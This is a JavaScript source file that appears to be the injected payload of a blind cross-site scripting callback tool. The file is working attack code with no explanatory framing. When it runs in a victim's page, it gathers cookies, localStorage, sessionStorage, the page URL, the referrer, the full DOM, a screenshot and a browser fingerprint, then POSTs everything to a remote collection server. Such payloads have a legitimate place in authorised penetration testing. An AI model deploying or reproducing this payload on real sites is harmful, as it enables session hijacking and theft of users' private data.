import FingerprintJS from "@fingerprintjs/fingerprintjs"
import html2canvas from "html2canvas"

async function gatherData(exclusions, tags) {
  let dataToSend = {}

  try {
    if (tags.length > 0) {
      dataToSend.tags = tags.join()
    }
    if (!exclusions.includes("local_storage")) {
      dataToSend.local_storage = JSON.stringify(localStorage)
    }
    if (!exclusions.includes("session_storage")) {
      dataToSend.session_storage = JSON.stringify(sessionStorage)
    }
    if (!exclusions.includes("cookies")) {
      dataToSend.cookies = document.cookie
    }
    if (!exclusions.includes("origin_url")) {
      dataToSend.origin_url = location.href
    }
    if (!exclusions.includes("referrer")) {
      dataToSend.referrer = document.referrer
    }
    if (!exclusions.includes("dom")) {
      dataToSend.dom = document.documentElement.innerHTML
    }
    if (!exclusions.includes("screenshot")) {
      dataToSend.screenshot = await html2canvas(document.querySelector("html")).then((screenshot) => {
        return screenshot.toDataURL()
      })
    }
    if (!exclusions.includes("fingerprint")) {
      const fingerprintLoader = await FingerprintJS.load().then((fp) => {
        return fp
      })
      dataToSend.fingerprint = await fingerprintLoader.get().then((fingerprint) => {
        return JSON.stringify(fingerprint)
      })
    }
    return dataToSend
  } catch (e) {
    throw e
  }
}

function serverCallback(baseURL, data) {
  const request = new XMLHttpRequest()
  request.open("POST", baseURL, true)
  request.setRequestHeader("Content-type", "application/json;charset=UTF-8")
  request.send(JSON.stringify(data))
}

function sendData() {
  let currentScript =
    document.currentScript ||
    (function () {
      var scripts = document.getElementsByTagName("script")
      return scripts[scripts.length - 1]
    })()

  let scriptData = atob(currentScript.getAttribute("data")).split(",")
  let scriptUrl = new URL(currentScript.src)

  let callbackUrl = `${scriptUrl.origin}/api/x/${scriptData[0]}/${scriptData[1]}`
  let exclusions = scriptData[2].split(";")
  let tags = scriptData[3].split(";")

  gatherData(exclusions, tags).then((result) => {
    serverCallback(callbackUrl, result)
  })
}

sendData()
